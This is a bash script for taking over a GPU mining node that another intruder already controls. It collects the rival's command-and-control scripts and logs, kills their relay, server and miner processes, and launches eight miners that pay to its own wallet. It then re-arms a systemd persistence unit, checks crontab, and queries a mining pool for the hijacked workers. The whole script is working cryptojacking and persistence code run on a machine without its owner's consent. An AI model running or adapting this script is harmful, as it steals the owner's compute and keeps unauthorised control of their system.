#!/bin/bash
# UL takedown pass: seize the farm node from the occupant's control channel,
# harvest their C2 scripts, then leave only our 8 canonical miners + our persistence.
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
PREFIX=${PREFIX:-ul-t2-123-184-7-135}
D=/root/ul
A=$D/actor
mkdir -p "$A" "$D/logs"

echo "### ACTOR-INTEL $(date -u +%FT%TZ)"
for f in /opt/t19/boot_wr.sh /opt/t19/boot_krig.sh /tmp/r.sh; do echo "--- $f"; cat "$f" 2>/dev/null | head -40; done
echo "--- /opt/t19 files"; ls -la /opt/t19/ /opt/t19/www/ /opt/t19/bak/ 2>/dev/null | head -40
echo "--- relay.py head"; head -60 /opt/t19/relay.py 2>/dev/null
echo "--- srv2.py head"; head -60 /opt/t19/www/srv2.py 2>/dev/null
echo "--- out.txt tail"; tail -40 /opt/t19/www/out.txt 2>/dev/null
echo "--- listeners"; ss -lntp 2>/dev/null | grep -E ':8090|:8099|:8080'
cp -f /opt/t19/boot_wr.sh /opt/t19/boot_krig.sh /opt/t19/relay.py /opt/t19/www/srv2.py /tmp/r.sh "$A"/ 2>/dev/null
cp -f /opt/t19/www/out.txt "$A"/out.txt 2>/dev/null

echo "### ACTOR-KILL"
ps -eo pid,args | grep -F 'http://127.0.0.1:8099' | grep -v grep | awk '{print $1}' | while read -r p; do kill -KILL "$p" && echo "kill-loop $p"; done
for pat in '/opt/t19/relay.py' '/opt/t19/www/srv2.py' 'http.server 8090'; do
  ps -eo pid,args | grep -F "$pat" | grep -v grep | awk '{print $1}' | while read -r p; do kill -KILL "$p" && echo "kill-actor $p $pat"; done
done
for f in /opt/t19/relay.py /opt/t19/www/srv2.py /opt/t19/boot_wr.sh /opt/t19/boot_krig.sh; do
  if [ -f "$f" ] && [ ! -f "$f.orig" ]; then mv "$f" "$f.orig" 2>/dev/null && echo "moved $f"; fi
done
sleep 2

echo "### DEDUPE"
ps -eo pid,args | grep -E 'wildrig' | grep -v grep | awk '{print $1}' | while read -r p; do kill -KILL "$p" 2>/dev/null; done
sleep 3
dev=0
while [ $dev -lt 8 ]; do
  f="$D/cmd-g$dev.sh"
  if [ -f "$f" ]; then setsid nohup sh "$f" >/dev/null 2>&1 & echo "start $PREFIX-g$dev"; fi
  dev=$((dev+1))
  sleep 1
done

echo "### PERSIST-RECHECK"
systemctl restart ul-pearl-keep 2>/dev/null
echo "unit=$(systemctl is-active ul-pearl-keep 2>/dev/null)"
crontab -l 2>/dev/null | tail -3

sleep 40
echo "### PROCS"
ps -eo pid,args | grep -E 'wildrig' | grep -v grep
echo "### ACCEPTED"
for g in 0 1 2 3 4 5 6 7; do printf 'g%s: ' $g; grep -aE 'accepted' "$D/logs/g$g.log" 2>/dev/null | tail -1; done
echo "### LOCAL-API"
for p in 1960 1961 1962 1963 1964 1965 1966 1967; do printf 'api %s: ' $p; curl -s -m 3 "http://127.0.0.1:$p/" 2>/dev/null | tr -d '\n' | head -c 200; echo; done
echo "### POOL-FROM-HOST"
curl -s -m 25 "https://pearlhash.xyz/api/account/$WALLET" | python3 -c '
import json,sys
try: d=json.load(sys.stdin)
except Exception as e: print("parse",e); raise SystemExit
ws=d.get("connected_workers") or []
print("workers",len(ws),"est15",d.get("estimated_hashrate_15s"))
for w in ws:
    n=w.get("worker_name") or ""
    if "123-184" in n or "93863" in n:
        print(n, w.get("version"), json.dumps(w.get("gpu_info"))[:200])
' 2>&1 | head -30
echo "### DONE-TAKEDOWN"
